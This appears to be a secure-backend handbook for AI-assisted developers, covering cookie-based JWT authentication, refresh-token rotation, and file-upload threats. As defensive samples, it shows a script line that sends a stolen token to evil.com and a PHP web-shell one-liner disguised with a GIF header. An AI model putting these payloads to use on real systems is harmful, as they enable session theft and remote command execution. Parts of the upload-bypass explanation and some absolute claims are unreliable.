# THE SECURE BACKEND MASTER-VAULT

## The Complete Anti-Hack Blueprint & Production Prompt Engineering Handbook for AI-Assisted Developers

---

> **This is not a tutorial. This is a war manual for backend developers who use AI tools to build production applications. Every line of code you ship is an attack surface. Every prompt you write to an AI is a potential vulnerability injection point. This handbook exists to make you dangerous to attackers and untouchable to OWASP.**

---

## How to Use This Handbook

This manual is structured into **5 mission-critical modules**, each containing:

1. **Threat Analysis** — What can kill your application
2. **Architectural Deep Dive** — Why the secure path is non-negotiable
3. **Master Prompts** — Battle-tested prompts that force AI to write secure code
4. **Production Code** — Copy-paste-ready implementations with zero dependencies on theory

**The Golden Rule:** Never trust the client. Never trust the AI's first draft. Never deploy without verification.

---

# MODULE 1: AUTHENTICATION & ACCESS CONTROL

## Pages 1–4 | The Front Door Is Where Everyone Breaks In

---

## 1.1 Threat Vector Analysis

Authentication is the single highest-value target in any web application. If an attacker compromises authentication, they own the entire system — not just one user's data, but every user's data.

### Attack Surface Map

| Attack Vector | Severity | Prevalence | Impact |
|---|---|---|---|
| **Session Hijacking** | Critical | High | Full account takeover |
| **JWT Tampering / None Algorithm** | Critical | Medium | Privilege escalation |
| **LocalStorage Token Theft (XSS)** | Critical | High | Session stealing |
| **IDOR (Insecure Direct Object Reference)** | High | Very High | Data exfiltration |
| **Brute Force / Credential Stuffing** | High | Very High | Mass account compromise |
| **Token Replay Attacks** | Medium | Medium | Unauthorized API access |
| **Race Conditions on Auth Endpoints** | Medium | Low | Token forgery edge cases |

### The LocalStorage Catastrophe

**The #1 mistake AI-generated code makes:** Storing JWTs in `localStorage`.

Why this is fatal:

```javascript
// DANGEROUS — AI often generates this by default
localStorage.setItem('token', response.data.token);

// If ANY XSS vulnerability exists anywhere in your application —
// any input field, any comment section, any third-party script —
// an attacker can execute:
const stolenToken = localStorage.getItem('token');
fetch('https://evil.com/collect?token=' + stolenToken);

// Your user's session is now owned. Permanently.
// The attacker has full API access until token expiration.
// LocalStorage is accessible to ALL JavaScript on the page.
// There is NO mitigation for XSS + localStorage tokens.
```

**The fix is architectural, not behavioral.** You cannot patch XSS perfectly. You must assume XSS will eventually exist and design your auth system to survive it.

### Session Hijacking Vectors

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK SURFACE MAP                        │
│                                                              │
│  [Browser] ──XSS──► [localStorage] ──► [Stolen JWT]        │
│                                                              │
│  [Browser] ──CSRF──► [State-Changing Request] ──► [IDOR]   │
│                                                              │
│  [Attacker] ──Token Replay──► [API Endpoint] ──► [Access]  │
│                                                              │
│  [Bot] ──Brute Force──► [Login Endpoint] ──► [Breach]      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 1.2 Architectural Deep Dive: Cookie-Based HTTP-Only Auth vs. LocalStorage JWTs

### Why HTTP-Only Cookies Are Non-Negotiable

The fundamental insight: **you cannot protect tokens from XSS if the tokens are in JavaScript-accessible storage.** HTTP-only cookies solve this by making tokens completely invisible to JavaScript.

```
┌────────────────────────────────────────────────────────────────┐
│              SECURE AUTH ARCHITECTURE                          │
│                                                                │
│  Login Request ──► Server validates credentials                │
│       │                                                        │
│       ├──► Sets HTTP-Only, Secure, SameSite=Lax cookie        │
│       │    (token is NEVER exposed to client JS)               │
│       │                                                        │
│       ├──► Refresh token stored in separate HTTP-Only cookie   │
│       │    with shorter rotation window                         │
│       │                                                        │
│       └──► Client only receives: { userId, role }              │
│            (non-sensitive metadata for UI rendering)            │
│                                                                │
│  API Request ──► Browser automatically attaches cookies        │
│       │                                                        │
│       └──► Server validates token from cookie                  │
│            (attacker with XSS sees NOTHING in JS)              │
└────────────────────────────────────────────────────────────────┘
```

### Cookie Security Flags — The Non-Negotiable Checklist

| Flag | Value | Why |
|---|---|---|
| `httpOnly` | `true` | Prevents JavaScript access. Period. |
| `secure` | `true` | Cookie only sent over HTTPS. Prevents MITM. |
| `sameSite` | `Lax` | Prevents CSRF on cross-origin requests. Use `Strict` for banking. |
| `maxAge` | `15 * 60 * 1000` | 15-minute access token window. Short = safe. |
| `path` | `/` | Ensures cookie is sent with all API routes. |
| `domain` | Explicit domain | Prevents cookie leakage to subdomains. |

### The Refresh Token Rotation Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              TOKEN ROTATION FLOW                                 │
│                                                                  │
│  ACCESS TOKEN (15 min)          REFRESH TOKEN (7 days)          │
│  ┌──────────────┐               ┌──────────────┐                │
│  │ JWT in       │               │ Opaque token │                │
│  │ HTTP-Only    │               │ stored in    │                │
│  │ Cookie       │               │ DB + HTTP-   │                │
│  │              │               │ Only Cookie  │                │
│  └──────┬───────┘               └──────┬───────┘                │
│         │                               │                        │
│         │  Expires naturally            │  On use, rotate:       │
│         │                               │  - Issue new refresh   │
│         ▼                               │  - Invalidate old one  │
│  [401 Unauthorized]                     │  - If old token reused │
│         │                               │    → REVOKE ALL        │
│         │                               │    (token theft!)      │
│         ▼                               ▼                        │
│  [Silent refresh via                     │                        │
│   refresh cookie] ◄─────────────────────┘                        │
│                                                                  │
│  CRITICAL: If a refresh token is used AFTER it was already       │
│  rotated, it means the old token was stolen. Revoke the         │
│  entire token family immediately.                                │
└──────────────────────────────────────────────────────────────────┘
```

### Why This Architecture Defeats XSS

Even if an attacker injects malicious script via XSS:

1. **Access token:** Invisible to JavaScript (HTTP-Only). Cannot be exfiltrated.
2. **Refresh token:** Invisible to JavaScript (HTTP-Only). Cannot be stolen.
3. **CSRF protection:** SameSite=Lax cookies are not sent on cross-origin POST requests.
4. **If access token is stolen via network sniffing:** Short 15-minute window limits damage.
5. **If refresh token is stolen via network:** Rotation invalidates it on next use.

---

## 1.3 Master Prompt: AI-Enforced Secure JWT Authentication

> **Copy this prompt into Cursor, ChatGPT, or Claude exactly as written. It forces the AI to produce secure, production-ready authentication code.**

### The Prompt

```
You are a senior security engineer with 15 years of experience in
production authentication systems. Your code must be immune to the
OWASP Top 10.

Write a complete, production-ready JWT authentication system for
Next.js (App Router) with Express.js backend that implements ALL
of the following security requirements:

MANDATORY SECURITY REQUIREMENTS:

1. TOKEN STORAGE:
   - Access tokens MUST be stored in HTTP-Only, Secure, SameSite=Lax
     cookies ONLY. NEVER use localStorage or sessionStorage.
   - Refresh tokens MUST be stored in a separate HTTP-Only, Secure,
     SameSite=Strict cookie with a longer expiration.
   - NEVER expose raw tokens to client-side JavaScript.

2. TOKEN GENERATION:
   - Access tokens: 15-minute expiration, signed with RS256
     (asymmetric), contain ONLY: userId, role, sessionId.
   - Refresh tokens: 7-day expiration, cryptographically random
     opaque string (NOT a JWT), stored hashed (SHA-256) in database.
   - Each refresh token belongs to a specific device/session.

3. REFRESH TOKEN ROTATION:
   - On every refresh, issue a NEW refresh token and invalidate the
     old one.
   - If a refresh token is reused AFTER rotation, this indicates
     token theft. Revoke the ENTIRE token family (all tokens for
     that user from that device).
   - Store a "family_id" on each token family for revocation tracking.

4. AUTHENTICATION MIDDLEWARE:
   - Verify JWT signature using RS256 public key.
   - Check token expiration with a 30-second grace period for
     clock skew.
   - Validate that the session_id in the token exists in the database
     and hasn't been revoked.
   - Attach user context to request object (userId, role, sessionId).
   - Return 401 with specific error codes (not verbose messages).

5. LOGIN/LOGOUT:
   - Login: Validate credentials, generate both tokens, set cookies.
   - Logout: Clear both cookies, invalidate the refresh token and
     all tokens in the same family_id.
   - Implement account lockout after 5 failed attempts (15-minute
     exponential backoff).

6. ERROR HANDLING:
   - NEVER return stack traces or internal error details to client.
   - Use generic error messages: "Authentication failed" — never
     "Invalid password" or "User not found" (prevents enumeration).
   - Log all authentication failures server-side with IP, user agent,
     timestamp.

7. TYPE SAFETY:
   - Define TypeScript interfaces for all token payloads, request
     extensions, and database models.
   - Use strict typing throughout. No `any` types.

Output format: Complete, copy-paste-ready TypeScript files with clear
file path comments. Include the middleware, cookie helpers, token
service, auth routes, and TypeScript types.
```

---

## 1.4 Production Code: Secure Auth Implementation

### File: `types/auth.ts`

```typescript
// types/auth.ts — Core authentication type definitions

export interface AccessTokenPayload {
  userId: string;
  role: 'admin' | 'user' | 'viewer';
  sessionId: string;
  iat: number;
  exp: number;
}

export interface RefreshTokenRecord {
  id: string;
  tokenHash: string;          // SHA-256 hash of the opaque refresh token
  userId: string;
  familyId: string;           // Groups all tokens from same device/session
  sessionId: string;
  deviceFingerprint: string;  // Hashed user-agent + accept-language
  expiresAt: Date;
  createdAt: Date;
  lastUsedAt: Date | null;
  isRevoked: boolean;
}

export interface AuthenticatedRequest extends Request {
  userId: string;
  role: 'admin' | 'user' | 'viewer';
  sessionId: string;
}

export interface LoginAttemptRecord {
  ip: string;
  attempts: number;
  lastAttempt: Date;
  lockedUntil: Date | null;
}

export interface CookieOptions {
  httpOnly: true;
  secure: true;
  sameSite: 'lax' | 'strict';
  maxAge: number;
  path: '/';
  domain?: string;
}
```

### File: `lib/token-service.ts`

```typescript
// lib/token-service.ts — JWT generation, verification, and refresh rotation

import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { db } from './database';
import type { AccessTokenPayload, RefreshTokenRecord } from '../types/auth';

const ACCESS_TOKEN_EXPIRY = '15m';
const REFRESH_TOKEN_EXPIRY_DAYS = 7;
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_BASE_MINUTES = 15;

// Use asymmetric keys for production — NEVER use HMAC for JWTs
const PRIVATE_KEY = process.env.JWT_PRIVATE_KEY!;   // RS256 private key
const PUBLIC_KEY = process.env.JWT_PUBLIC_KEY!;     // RS256 public key

export class TokenService {
  /**
   * Generate an access token (short-lived, JWT).
   * Contains ONLY non-sensitive claims.
   */
  static generateAccessToken(
    userId: string,
    role: 'admin' | 'user' | 'viewer',
    sessionId: string
  ): string {
    const payload: Omit<AccessTokenPayload, 'iat' | 'exp'> = {
      userId,
      role,
      sessionId,
    };

    return jwt.sign(payload, PRIVATE_KEY, {
      algorithm: 'RS256',
      expiresIn: ACCESS_TOKEN_EXPIRY,
      issuer: 'your-app-name',
      audience: 'your-api-domain',
    });
  }

  /**
   * Generate a refresh token (long-lived, opaque).
   * The raw token goes to the client; only the hash is stored in DB.
   */
  static async generateRefreshToken(
    userId: string,
    sessionId: string,
    familyId: string,
    deviceFingerprint: string
  ): Promise<{ rawToken: string; hashedToken: string }> {
    // Generate a cryptographically secure opaque token (NOT a JWT)
    const rawToken = crypto.randomBytes(64).toString('hex');
    const hashedToken = crypto
      .createHash('sha256')
      .update(rawToken)
      .digest('hex');

    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + REFRESH_TOKEN_EXPIRY_DAYS);

    await db.refreshToken.create({
      data: {
        tokenHash: hashedToken,
        userId,
        familyId,
        sessionId,
        deviceFingerprint,
        expiresAt,
        isRevoked: false,
      },
    });

    return { rawToken, hashedToken };
  }

  /**
   * Verify an access token and return its decoded payload.
   * Includes 30-second grace period for clock skew.
   */
  static verifyAccessToken(token: string): AccessTokenPayload {
    try {
      const decoded = jwt.verify(token, PUBLIC_KEY, {
        algorithms: ['RS256'],
        issuer: 'your-app-name',
        audience: 'your-api-domain',
        clockTolerance: 30, // 30-second grace period
      }) as AccessTokenPayload;

      return decoded;
    } catch (error) {
      if (error instanceof jwt.TokenExpiredError) {
        throw new AuthError('TOKEN_EXPIRED', 'Access token has expired');
      }
      if (error instanceof jwt.JsonWebTokenError) {
        throw new AuthError('INVALID_TOKEN', 'Token verification failed');
      }
      throw new AuthError('AUTH_ERROR', 'Authentication failed');
    }
  }

  /**
   * Rotate a refresh token. Returns new access + refresh tokens.
   * If the old token was already used (replay), revokes the entire family.
   */
  static async rotateRefreshToken(
    oldRefreshTokenRaw: string,
    deviceFingerprint: string
  ): Promise<{
    newAccessToken: string;
    newRefreshTokenRaw: string;
  }> {
    const hashedOld = crypto
      .createHash('sha256')
      .update(oldRefreshTokenRaw)
      .digest('hex');

    // Find the refresh token record
    const tokenRecord = await db.refreshToken.findFirst({
      where: { tokenHash: hashedOld },
      include: { user: true },
    });

    if (!tokenRecord) {
      throw new AuthError('INVALID_REFRESH', 'Refresh token not recognized');
    }

    if (tokenRecord.isRevoked) {
      // CRITICAL: Token was already used — this is a theft attempt
      // Revoke ALL tokens in this family
      await this.revokeTokenFamily(tokenRecord.familyId);
      throw new AuthError(
        'TOKEN_THEFT_DETECTED',
        'Refresh token reuse detected. All sessions revoked for security.'
      );
    }

    // Check expiration
    if (new Date() > tokenRecord.expiresAt) {
      await this.revokeTokenFamily(tokenRecord.familyId);
      throw new AuthError('TOKEN_EXPIRED', 'Refresh token has expired');
    }

    // Verify device fingerprint matches (additional security layer)
    if (tokenRecord.deviceFingerprint !== deviceFingerprint) {
      await this.revokeTokenFamily(tokenRecord.familyId);
      throw new AuthError(
        'DEVICE_MISMATCH',
        'Device fingerprint does not match. Session revoked.'
      );
    }

    // Invalidate the old token
    await db.refreshToken.update({
      where: { id: tokenRecord.id },
      data: { isRevoked: true },
    });

    // Generate new token pair (same family, new token)
    const newAccessToken = this.generateAccessToken(
      tokenRecord.userId,
      tokenRecord.user.role as 'admin' | 'user' | 'viewer',
      tokenRecord.sessionId
    );

    const { rawToken: newRefreshTokenRaw } = await this.generateRefreshToken(
      tokenRecord.userId,
      tokenRecord.sessionId,
      tokenRecord.familyId, // Same family
      deviceFingerprint
    );

    return { newAccessToken, newRefreshTokenRaw };
  }

  /**
   * Revoke all tokens in a family (theft response).
   */
  static async revokeTokenFamily(familyId: string): Promise<void> {
    await db.refreshToken.updateMany({
      where: { familyId },
      data: { isRevoked: true },
    });

    // Log the security event
    console.error(
      `[SECURITY] Token family ${familyId} revoked due to reuse detection at ${new Date().toISOString()}`
    );
  }

  /**
   * Revoke all tokens for a user (logout everywhere).
   */
  static async revokeAllUserTokens(userId: string): Promise<void> {
    await db.refreshToken.updateMany({
      where: { userId },
      data: { isRevoked: true },
    });
  }

  /**
   * Check and enforce account lockout policy.
   */
  static async checkLoginAttempts(
    ip: string
  ): Promise<{ allowed: boolean; retryAfterSeconds?: number }> {
    const record = await db.loginAttempt.findUnique({ where: { ip } });

    if (!record) return { allowed: true };

    // Check if currently locked out
    if (record.lockedUntil && new Date() < record.lockedUntil) {
      const retryAfter = Math.ceil(
        (record.lockedUntil.getTime() - Date.now()) / 1000
      );
      return { allowed: false, retryAfterSeconds: retryAfter };
    }

    // Reset if lockout expired
    if (record.lockedUntil && new Date() >= record.lockedUntil) {
      await db.loginAttempt.update({
        where: { ip },
        data: { attempts: 0, lockedUntil: null },
      });
      return { allowed: true };
    }

    return { allowed: true };
  }

  /**
   * Record a failed login attempt. Locks account after threshold.
   */
  static async recordFailedLogin(ip: string): Promise<void> {
    const record = await db.loginAttempt.findUnique({ where: { ip } });

    if (!record) {
      await db.loginAttempt.create({
        data: {
          ip,
          attempts: 1,
          lastAttempt: new Date(),
          lockedUntil: null,
        },
      });
      return;
    }

    const newAttempts = record.attempts + 1;

    if (newAttempts >= MAX_LOGIN_ATTEMPTS) {
      // Exponential backoff: 15min, 30min, 60min, etc.
      const lockoutMinutes =
        LOCKOUT_BASE_MINUTES * Math.pow(2, Math.floor(newAttempts / MAX_LOGIN_ATTEMPTS) - 1);

      const lockedUntil = new Date();
      lockedUntil.setMinutes(lockedUntil.getMinutes() + lockoutMinutes);

      await db.loginAttempt.update({
        where: { ip },
        data: {
          attempts: newAttempts,
          lastAttempt: new Date(),
          lockedUntil,
        },
      });

      console.warn(
        `[SECURITY] IP ${ip} locked out until ${lockedUntil.toISOString()} after ${newAttempts} failed attempts`
      );
    } else {
      await db.loginAttempt.update({
        where: { ip },
        data: {
          attempts: newAttempts,
          lastAttempt: new Date(),
        },
      });
    }
  }
}

export class AuthError extends Error {
  constructor(
    public code: string,
    message: string,
    public statusCode: number = 401
  ) {
    super(message);
    this.name = 'AuthError';
  }
}
```

### File: `lib/cookie-helpers.ts`

```typescript
// lib/cookie-helpers.ts — Secure cookie configuration

import type { CookieOptions, AccessTokenPayload } from '../types/auth';

const isProduction = process.env.NODE_ENV === 'production';

export const ACCESS_TOKEN_COOKIE: CookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 15 * 60 * 1000,   // 15 minutes
  path: '/',
};

export const REFRESH_TOKEN_COOKIE: CookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  path: '/api/auth',  // Scoped to auth endpoints only
};

/**
 * Set authentication cookies on the response.
 * Access token: 15-minute window, Lax CSRF protection.
 * Refresh token: 7-day window, Strict CSRF protection, scoped path.
 */
export function setAuthCookies(
  response: Response,
  accessToken: string,
  refreshToken: string
): void {
  const accessCookie = serializeCookie('access_token', accessToken, {
    ...ACCESS_TOKEN_COOKIE,
    domain: isProduction ? process.env.COOKIE_DOMAIN : undefined,
  });

  const refreshCookie = serializeCookie('refresh_token', refreshToken, {
    ...REFRESH_TOKEN_COOKIE,
    domain: isProduction ? process.env.COOKIE_DOMAIN : undefined,
  });

  response.headers.append('Set-Cookie', accessCookie);
  response.headers.append('Set-Cookie', refreshCookie);
}

/**
 * Clear authentication cookies (logout).
 */
export function clearAuthCookies(response: Response): void {
  const clearAccess = serializeCookie('access_token', '', {
    ...ACCESS_TOKEN_COOKIE,
    maxAge: 0,
    domain: isProduction ? process.env.COOKIE_DOMAIN : undefined,
  });

  const clearRefresh = serializeCookie('refresh_token', '', {
    ...REFRESH_TOKEN_COOKIE,
    maxAge: 0,
    domain: isProduction ? process.env.COOKIE_DOMAIN : undefined,
  });

  response.headers.append('Set-Cookie', clearAccess);
  response.headers.append('Set-Cookie', clearRefresh);
}

/**
 * Extract and parse the access token from request cookies.
 * Returns null if cookie is missing or malformed.
 */
export function getAccessTokenFromRequest(
  request: Request
): string | null {
  const cookieHeader = request.headers.get('cookie');
  if (!cookieHeader) return null;

  const cookies = parseCookies(cookieHeader);
  return cookies['access_token'] || null;
}

/**
 * Extract and parse the refresh token from request cookies.
 */
export function getRefreshTokenFromRequest(
  request: Request
): string | null {
  const cookieHeader = request.headers.get('cookie');
  if (!cookieHeader) return null;

  const cookies = parseCookies(cookieHeader);
  return cookies['refresh_token'] || null;
}

/**
 * Generate a device fingerprint from request headers.
 * Used to detect token theft from different devices.
 */
export function generateDeviceFingerprint(request: Request): string {
  const crypto = require('crypto');
  const userAgent = request.headers.get('user-agent') || 'unknown';
  const acceptLang = request.headers.get('accept-language') || 'unknown';
  const acceptEncoding = request.headers.get('accept-encoding') || 'unknown';

  return crypto
    .createHash('sha256')
    .update(`${userAgent}|${acceptLang}|${acceptEncoding}`)
    .digest('hex');
}

// ─── Internal Helpers ─────────────────────────────────────────

function serializeCookie(
  name: string,
  value: string,
  options: CookieOptions & { maxAge?: number; domain?: string }
): string {
  let cookie = `${name}=${value}`;
  cookie += `; HttpOnly`;
  cookie += `; Secure`;
  cookie += `; SameSite=${options.sameSite}`;
  cookie += `; Path=${options.path}`;
  if (options.maxAge !== undefined) {
    cookie += `; Max-Age=${Math.floor(options.maxAge / 1000)}`;
  }
  if (options.domain) {
    cookie += `; Domain=${options.domain}`;
  }
  return cookie;
}

function parseCookies(cookieHeader: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  cookieHeader.split(';').forEach((pair) => {
    const [name, ...value] = pair.split('=');
    if (name && value.length > 0) {
      cookies[name.trim()] = decodeURIComponent(value.join('=').trim());
    }
  });
  return cookies;
}
```

### File: `middleware/auth.ts`

```typescript
// middleware/auth.ts — Authentication middleware for Express/Next.js

import { TokenService, AuthError } from '../lib/token-service';
import {
  getAccessTokenFromRequest,
  generateDeviceFingerprint,
} from '../lib/cookie-helpers';
import type { AuthenticatedRequest } from '../types/auth';

/**
 * Express-compatible authentication middleware.
 * Verifies access token from HTTP-Only cookie.
 * Attaches user context to request object.
 */
export async function requireAuth(
  req: AuthenticatedRequest,
  res: Response,
  next: () => void
): Promise<void> {
  try {
    const token = getAccessTokenFromRequest(req as unknown as Request);

    if (!token) {
      throw new AuthError('NO_TOKEN', 'Authentication required', 401);
    }

    // Verify JWT signature and expiration
    const payload = TokenService.verifyAccessToken(token);

    // Optional: Validate session still exists and isn't revoked
    // Uncomment if using session-based revocation:
    // const session = await db.session.findUnique({
    //   where: { id: payload.sessionId },
    // });
    // if (!session || session.isRevoked) {
    //   throw new AuthError('SESSION_REVOKED', 'Session has been revoked', 401);
    // }

    // Attach user context to request
    req.userId = payload.userId;
    req.role = payload.role;
    req.sessionId = payload.sessionId;

    next();
  } catch (error) {
    if (error instanceof AuthError) {
      res.status(error.statusCode).json({
        error: { code: error.code, message: error.message },
      });
      return;
    }

    // Never expose internal errors
    console.error('[AUTH] Unexpected authentication error:', error);
    res.status(401).json({
      error: { code: 'AUTH_ERROR', message: 'Authentication failed' },
    });
  }
}

/**
 * Role-based authorization middleware.
 * Must be used AFTER requireAuth middleware.
 */
export function requireRole(...allowedRoles: string[]) {
  return (req: AuthenticatedRequest, res: Response, next: () => void) => {
    if (!allowedRoles.includes(req.role)) {
      res.status(403).json({
        error: {
          code: 'FORBIDDEN',
          message: 'Insufficient permissions',
        },
      });
      return;
    }
    next();
  };
}

/**
 * Token refresh endpoint handler.
 * Implements refresh token rotation with theft detection.
 */
export async function handleTokenRefresh(
  req: Request
): Promise<Response> {
  try {
    const refreshToken = req.headers
      .get('cookie')
      ?.split(';')
      .find((c) => c.trim().startsWith('refresh_token='))
      ?.split('=')[1];

    if (!refreshToken) {
      return new Response(
        JSON.stringify({
          error: { code: 'NO_REFRESH_TOKEN', message: 'Refresh token required' },
        }),
        { status: 401, headers: { 'Content-Type': 'application/json' } }
      );
    }

    const deviceFingerprint = generateDeviceFingerprint(req);
    const decodedRefresh = decodeURIComponent(refreshToken);

    const { newAccessToken, newRefreshTokenRaw } =
      await TokenService.rotateRefreshToken(decodedRefresh, deviceFingerprint);

    const response = new Response(
      JSON.stringify({ message: 'Token refreshed successfully' }),
      {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }
    );

    // Set new cookies
    const accessCookie = `access_token=${newAccessToken}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=${15 * 60}`;
    const refreshCookie = `refresh_token=${encodeURIComponent(newRefreshTokenRaw)}; HttpOnly; Secure; SameSite=Strict; Path=/api/auth; Max-Age=${7 * 24 * 60 * 60}`;

    response.headers.append('Set-Cookie', accessCookie);
    response.headers.append('Set-Cookie', refreshCookie);

    return response;
  } catch (error) {
    console.error('[AUTH] Token refresh error:', error);

    if (error instanceof AuthError) {
      return new Response(
        JSON.stringify({
          error: { code: error.code, message: error.message },
        }),
        {
          status: error.statusCode,
          headers: { 'Content-Type': 'application/json' },
        }
      );
    }

    return new Response(
      JSON.stringify({
        error: { code: 'REFRESH_ERROR', message: 'Token refresh failed' },
      }),
      {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
      }
    );
  }
}
```

---

### Module 1 Security Checklist

| # | Check | Status |
|---|---|---|
| 1 | Access tokens stored in HTTP-Only cookies only | ⬜ |
| 2 | Refresh tokens stored in separate HTTP-Only cookie | ⬜ |
| 3 | Tokens never exposed to localStorage/sessionStorage | ⬜ |
| 4 | RS256 asymmetric signing (not HMAC) | ⬜ |
| 5 | Access token expiry ≤ 15 minutes | ⬜ |
| 6 | Refresh token rotation implemented | ⬜ |
| 7 | Token theft detection (reuse detection) | ⬜ |
| 8 | Token family revocation on theft | ⬜ |
| 9 | Account lockout after failed attempts | ⬜ |
| 10 | Generic auth error messages (no user enumeration) | ⬜ |
| 11 | No stack traces in auth error responses | ⬜ |
| 12 | Device fingerprint validation | ⬜ |
| 13 | TypeScript strict typing, no `any` types | ⬜ |
| 14 | Secure cookie flags (HttpOnly, Secure, SameSite) | ⬜ |
| 15 | Logout invalidates all tokens | ⬜ |

---

# MODULE 2: SECURE FILE UPLOADS & EXECUTION ISOLATION

## Pages 5–8 | The Upload That Wipes Your Server

---

## 2.1 Threat Vector Analysis

File upload vulnerabilities are among the most devastating attack vectors in web applications. A single unvalidated upload can lead to complete server compromise, data exfiltration, or ransomware deployment.

### Attack Surface Map

| Attack Vector | Severity | Prevalence | Impact |
|---|---|---|---|
| **Remote Code Execution (RCE)** | Critical | High | Full server takeover |
| **Virus/Malware Injection** | Critical | High | Supply chain compromise |
| **Image Truncation Attacks** | High | Medium | MIME bypass, stored XSS |
| **Path Traversal via Filename** | Critical | High | Arbitrary file write |
| **Denial of Service (Disk Fill)** | High | High | Service disruption |
| **Polyglot File Attacks** | High | Low | Cross-context exploitation |
| **SVG/HTML Upload → Stored XSS** | Critical | High | Session theft |

### The RCE Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                    FILE UPLOAD ATTACK CHAIN                      │
│                                                                  │
│  [Attacker] uploads "profile.php.jpg"                            │
│       │                                                          │
│       ▼                                                          │
│  [Server] checks extension: .jpg ✓                               │
│       │                                                          │
│       ▼                                                          │
│  [Server] stores file as "/uploads/avatar_123.jpg"              │
│       │                                                          │
│       ▼                                                          │
│  [Server config] Apache/Nginx configured to execute .php         │
│       │                                                          │
│       ▼                                                          │
│  [Attacker] requests: /uploads/avatar_123.jpg                    │
│       │                                                          │
│       ▼                                                          │
│  [Server] sees PHP shebang, executes as PHP                       │
│       │                                                          │
│       ▼                                                          │
│  [Attacker] has SHELL ACCESS to your server                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Image Truncation Attack

```php
// THE TRUNCATION ATTACK — A classic bypass
// Upload a file that LOOKS like a valid image when truncated

// Step 1: Create a PHP shell:
// <?php system($_GET['cmd']); ?>

// Step 2: Append a GIF header (GIF89a) at the start:
// GIF89a
// <?php system($_GET['cmd']); ?>

// Step 3: ImageMagick (used by many servers) reads the GIF header,
//         "sees" a valid image, and stops reading.
//         BUT PHP continues reading past the GIF header.

// Step 4: Server validates: "It's a valid GIF!"
//         Attacker requests: /uploads/avatar.php
//         Server executes: system($_GET['cmd'])
//         RESULT: Full RCE
```

---

## 2.2 Architectural Deep Dive: Defense-in-Depth File Validation

### The Four-Layer Validation Model

```
┌──────────────────────────────────────────────────────────────────┐
│              FOUR-LAYER FILE VALIDATION                          │
│                                                                  │
│  LAYER 1: CLIENT-SIDE (Useless for security, UX only)           │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Accept attribute on <input>                  │              │
│  │  • JavaScript file extension check              │              │
│  │  • Preview/thumbnail generation                 │              │
│  │  • NEVER trust this layer for security          │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 2: REQUEST VALIDATION (Critical)                         │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Content-Type header validation               │              │
│  │  • File size limits (per-type and global)        │              │
│  │  • Filename sanitization (strip paths, special   │              │
│  │    chars, null bytes)                           │              │
│  │  • Reject if Content-Type ≠ declared type        │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 3: MAGIC BYTE VALIDATION (Critical)                      │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Read first 8-32 bytes of file                │              │
│  │  • Compare against known magic byte signatures   │              │
│  │  • JPEG: FF D8 FF                              │              │
│  │  • PNG:  89 50 4E 47 0D 0A 1A 0A              │              │
│  │  • GIF:  47 49 46 38 (GIF8)                    │              │
│  │  • PDF:  25 50 44 46 (%PDF)                    │              │
│  │  • REJECT if magic bytes ≠ expected MIME type    │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 4: RE-ENCODING (Bulletproof)                             │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Process image through Sharp/libvips           │              │
│  │  • This strips ALL metadata (EXIF, XMP, ICC)    │              │
│  │  • Removes embedded scripts (SVG XSS)           │              │
│  │  • Re-encodes to clean format (strips polyglots) │              │
│  │  • Output is a NEW image from raw pixel data     │              │
│  │  • Original file is NEVER served                 │              │
│  └────────────────────────────────────────────────┘              │
│                                                                  │
│  RESULT: Even if an attacker crafts a polyglot file that         │
│  passes layers 1-3, re-encoding DESTROYS the payload.           │
└──────────────────────────────────────────────────────────────────┘
```

### S3/Cloudflare R2 Isolation Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              SECURE FILE STORAGE ARCHITECTURE                    │
│                                                                  │
│  [Client]                                                        │
│     │                                                            │
│     │  1. POST /api/upload/request                               │
│     │     (metadata only: filename, size, type)                  │
│     │                                                            │
│     ▼                                                            │
│  [Server]                                                        │
│     │                                                            │
│     │  2. Validate metadata                                      │
│     │     - File type in allowlist?                              │
│     │     - Size within limits?                                  │
│     │     - User authenticated?                                  │
│     │                                                            │
│     │  3. Generate presigned S3 PUT URL                          │
│     │     - Path: /uploads/{userId}/{random-uuid}.{ext}         │
│     │     - Expiry: 60 seconds                                   │
│     │     - Content-Type: forced match to declared type          │
│     │                                                            │
│     ▼                                                            │
│  [Client]                                                        │
│     │                                                            │
│     │  4. Upload directly to S3 using presigned URL              │
│     │     (file never touches your server!)                      │
│     │                                                            │
│     ▼                                                            │
│  [S3 Bucket]                                                     │
│     │                                                            │
│     │  5. S3 triggers Lambda/CloudFlare Worker on upload         │
│     │                                                            │
│     ▼                                                            │
│  [Processing Pipeline]                                           │
│     │                                                            │
│     │  6. Validate magic bytes (defensive)                       │
│     │  7. Re-encode through Sharp (strip metadata, polyglots)    │
│     │  8. Store clean version in /clean/ bucket                  │
│     │  9. Delete original from /uploads/                         │
│     │  10. Return CDN URL of clean version                       │
│     │                                                            │
│     ▼                                                            │
│  [CDN (CloudFront/Cloudflare)]                                   │
│     │                                                            │
│     └──► Clean, re-encoded image served with                     │
│          Content-Disposition: inline,                             │
│          no-cache headers, and CORS restrictions                 │
│                                                                  │
│  KEY INSIGHT: The original file NEVER reaches your server.       │
│  The presigned URL goes directly to S3. Your server only         │
│  handles metadata validation and post-processing.                │
